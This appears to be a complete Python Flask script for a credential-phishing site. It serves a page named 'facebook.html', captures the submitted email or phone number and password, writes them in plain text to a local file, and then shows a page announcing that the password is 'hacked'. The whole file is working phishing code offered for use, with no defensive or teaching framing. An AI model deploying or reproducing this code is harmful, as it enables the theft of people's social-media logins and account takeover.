from flask import Flask,render_template, request, redirect, url_for  

app = Flask(__name__, static_folder='static')

@app.route("/") 
def login():
  return render_template("facebook.html")

@app.route("/login",methods=["POST"]) 
def data_input():
  email_or_mobile = request.form.get("username") 
  password = request.form.get("password") 
  
  with open("data.txt", "w") as f:
    f.write(email_or_mobile + "\n") 
    f.write(password + "\n")
    
  return redirect(url_for("success"))   
    
@app.route("/success")
def success():
  return "<h1>Your password are hacked!</h1>" 

if __name__ == "__main__":
  app.run(debug=True)